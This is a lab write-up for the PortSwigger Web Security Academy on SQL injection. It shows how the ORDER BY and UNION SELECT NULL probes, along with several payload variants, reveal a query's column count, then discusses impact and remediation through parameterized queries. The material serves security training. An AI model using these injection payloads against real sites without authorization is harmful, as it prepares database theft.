# SQL Injection UNION Attack, Determining the Number of Columns Returned by the Query

**Platform:** PortSwigger Web Security Academy
**Lab URL:** https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
**Difficulty:** Apprentice
**Date Completed:** November 1, 2026
**Status:** ✅ Solved

---

## 📋 Lab Description

**Objective:**
This lab has a SQL injection vulnerability in the product category filter. To exploit this, the goal is to determine the number of columns returned by the original query, using a `UNION` attack. This is a required first step before any further UNION-based data extraction can be done in later labs.

**Learning Goals:**
- Understand what a UNION attack is and why column count matters
- Learn two techniques for finding the number of columns: `ORDER BY` and `UNION SELECT NULL`
- Recognize the difference between a database error and a valid (even if empty-looking) response

---

## 🔍 Reconnaissance

**Initial Observation:**
- Product catalog site, same category filter as Lab 1: `?category=Gifts`
- Input is concatenated directly into the backend SQL query (confirmed vulnerable from Lab 1's pattern)

**Vulnerable Parameter:**
`category` parameter in the URL

**Suspected Vulnerable Query:**
```sql
SELECT * FROM products WHERE category = 'USER_INPUT' AND released = 1
```

**Why Column Count Matters:**
A `UNION SELECT` only works if it returns the **exact same number of columns** as the original query. Get the count wrong, and the database throws an error (or in some engines, just fails silently) instead of merging the data. This lab is purely about finding that number — no data extraction yet.

---

## 💉 Exploitation

### Method 1: `ORDER BY` Technique (used to solve this lab)

The idea: `ORDER BY N` sorts by the Nth column. If a query only has 3 columns and you ask it to sort by column 4, the database complains — because that column doesn't exist. Increment N until it breaks.

**Step 1 — Try ORDER BY 1:**
```
https://[lab-id].web-security-academy.net/filter?category=Gifts'+ORDER+BY+1--
```
**Result:** ✅ Normal response, no error → at least 1 column

**Step 2 — Try ORDER BY 2:**
```
https://[lab-id].web-security-academy.net/filter?category=Gifts'+ORDER+BY+2--
```
**Result:** ✅ Normal response, no error → at least 2 columns

**Step 3 — Try ORDER BY 3:**
```
https://[lab-id].web-security-academy.net/filter?category=Gifts'+ORDER+BY+3--
```
**Result:** ✅ Normal response, no error → at least 3 columns

**Step 4 — Try ORDER BY 4:**
```
https://[lab-id].web-security-academy.net/filter?category=Gifts'+ORDER+BY+4--
```
**Result:** ❌ Internal Server Error → column 4 doesn't exist

**Conclusion:** The query returns **3 columns**.  
✅ Lab solved — lab requirement is simply to confirm the column count this way.

---

### Method 2: `UNION SELECT NULL` Technique (alternative, also verified)

The idea: supply a `UNION SELECT` with an increasing number of `NULL` placeholders. `NULL` is valid in any column type, so once the count matches, the database accepts it instead of erroring.

**Step 1 — Try 1 NULL:**
```
category=Gifts'+UNION+SELECT+NULL--
```
**Result:** ❌ Error → not 1 column

**Step 2 — Try 2 NULLs:**
```
category=Gifts'+UNION+SELECT+NULL,NULL--
```
**Result:** ❌ Error → not 2 columns

**Step 3 — Try 3 NULLs:**
```
category=Gifts'+UNION+SELECT+NULL,NULL,NULL--
```
**Result:** ✅ No error, query executes successfully → **3 columns confirmed**

**Step 4 — Try 4 NULLs (sanity check):**
```
category=Gifts'+UNION+SELECT+NULL,NULL,NULL,NULL--
```
**Result:** ❌ Error → confirms 3 is correct, not more

---

## 🧠 Technical Explanation

### How `ORDER BY` Detection Works

1. **Original query:**
   ```sql
   SELECT * FROM products WHERE category = 'Gifts' ORDER BY 4
   ```
2. If the underlying `SELECT *` only returns 3 columns, `ORDER BY 4` references a column position that doesn't exist.
3. The database engine throws a column-index-out-of-range error, which the application either displays directly or surfaces as a generic 500 error.
4. The last value of N that does **not** error is the true column count.

### How `UNION SELECT NULL` Detection Works

1. A `UNION` combines the results of two `SELECT` statements — but **only if they have the same number of columns** (and compatible types per column).
2. `NULL` is special: it's compatible with virtually every SQL data type (int, varchar, date, etc.), so it's a safe universal placeholder when you don't yet know the column types.
3. You increment the number of `NULL`s until the database stops rejecting the query — that count is the real number of columns in the original `SELECT`.

### Why Both Techniques Matter

- `ORDER BY` is faster/cleaner when the app leaks database errors.
- `UNION SELECT NULL` is useful as a cross-check, and is the technique that leads directly into later labs (once you know the count, you replace `NULL`s with real payloads like `username`, `password`, or `@@version`).

---

## 🎯 Alternative Payloads Tested

### Payload 1: ORDER BY with comment variant (no trailing space)
```
category=Gifts'+ORDER+BY+3--+
```
**Result:** ✅ Works — trailing space/plus after `--` needed on some setups for the comment to parse cleanly

### Payload 2: Case-insensitive keywords
```
category=Gifts' order by 3--
```
**Result:** ✅ Works — SQL keywords are case-insensitive

### Payload 3: Using `#` comment instead of `--` (MySQL only)
```
category=Gifts'+ORDER+BY+3%23
```
**Result:** ✅ Works on MySQL-backed labs

### Payload 4: Binary search instead of linear increment
Instead of testing 1, 2, 3, 4... one at a time, jump straight to a higher guess (e.g. `ORDER BY 10`) and binary-search down. Faster when you suspect many columns.
```
category=Gifts'+ORDER+BY+10--   → error
category=Gifts'+ORDER+BY+5--    → error
category=Gifts'+ORDER+BY+3--    → success
category=Gifts'+ORDER+BY+4--    → error
```
**Result:** ✅ Confirms 3 columns faster with fewer requests

---

## 🚨 Impact Assessment

**Severity:** Medium (on its own) — this step alone only confirms query structure, but it is the **foundation for high-severity UNION-based data exfiltration** in subsequent labs.

**Business Impact:**
- Reveals internal query structure to an attacker
- Enables full UNION-based attacks: extracting usernames, password hashes, session tokens, or entire other tables
- No direct data leak at this stage, but it is the reconnaissance phase of a much larger attack chain

**Technical Impact:**
- Confirms injectable column count
- Confirms the application reflects database errors (information disclosure) or at least distinguishes success/failure states
- Sets up everything needed for `UNION SELECT` data extraction

**Attack Complexity:** Low (automatable, a handful of sequential requests)
**Privileges Required:** None (unauthenticated)
**User Interaction:** None

---

## 🛡️ Remediation

### Recommended Fix: Parameterized Queries

Exactly as with Labs 1 and 2 — the root cause is the same: untrusted input concatenated directly into SQL syntax.

**Vulnerable Code (example):**
```python
# BAD - String concatenation
query = "SELECT * FROM products WHERE category = '" + user_input + "' AND released = 1"
```

**Secure Code:**
```python
# GOOD - Parameterized query
cursor.execute(
    "SELECT * FROM products WHERE category = ? AND released = 1",
    (user_input,)
)
```

With a parameterized query, `ORDER BY`, `UNION`, and comment-based payloads are all treated as literal string data — they can never alter query structure, so column-count probing fails entirely.

### Additional Security Measures:

1. **Generic Error Messages:**
   - Never expose raw database errors (e.g. "column index out of range") to the client
   - Log detailed errors server-side; return a generic "Something went wrong" to the user
   - This alone significantly slows down `ORDER BY`-based column enumeration

2. **Input Validation:**
   - Whitelist allowed category values against a known list
   - Reject any input containing SQL metacharacters (`'`, `--`, `UNION`, etc.) if not expected

3. **Least Privilege Database Accounts:**
   - The application's DB user should not be able to query system tables or other schemas
   - Limits the blast radius even if UNION injection succeeds

4. **WAF / Database Firewall:**
   - Can flag suspicious `ORDER BY N` incrementing patterns or `UNION SELECT NULL` sequences
   - Defense-in-depth only, not a substitute for parameterized queries

---

## 📚 Lessons Learned

1. **Column Count Is the Gatekeeper for UNION Attacks:**
   - You cannot extract data via UNION until you know the exact column count
   - Getting it wrong just throws errors — it doesn't leak anything by itself

2. **`ORDER BY` Is the Fastest Discovery Method:**
   - Simple, linear, and only needs the app to distinguish "error" from "no error"
   - Doesn't require guessing data types

3. **`NULL` Is a Universal Type-Safe Placeholder:**
   - Useful when you don't yet know column data types
   - Essential building block before substituting real extraction payloads in later labs

4. **Error Visibility Is Itself a Vulnerability:**
   - Even without a classic injection, verbose SQL errors help attackers map the query structure
   - Generic error handling is a cheap, high-value mitigation

5. **This Lab Is a Stepping Stone:**
   - Determining column count has no value alone — it's prerequisite reconnaissance
   - Next labs build on this exact result (3 columns) to inject real payloads into the response

---

## 🔗 References

- **OWASP Top 10 2021:** A03:2021 – Injection
- **CWE-89:** Improper Neutralization of Special Elements used in an SQL Command
- **PortSwigger SQL Injection — UNION attacks:** https://portswigger.net/web-security/sql-injection/union-attacks
- **PortSwigger SQL Injection Cheat Sheet:** https://portswigger.net/web-security/sql-injection/cheat-sheet

---

## 📸 Screenshots

*(Add screenshots here showing:)*
1. Lab description page
2. `ORDER BY 1`, `2`, `3` — successful responses
3. `ORDER BY 4` — error response
4. (Optional) `UNION SELECT NULL,NULL,NULL` — successful cross-check
5. "Lab solved" confirmation

---

## ✅ Completion Checklist

- [x] Understood the lab objective
- [x] Identified vulnerable parameter
- [x] Determined column count via `ORDER BY`
- [x] Cross-verified column count via `UNION SELECT NULL`
- [x] Documented technical details
- [x] Researched proper remediation
- [x] Completed writeup

---

## 🏷️ Tags

`sql-injection` `union-attack` `column-enumeration` `portswigger` `web-security` `owasp-top-10` `apprentice` `injection`

---

*This writeup is for educational purposes as part of authorized security training on PortSwigger Web Security Academy.*
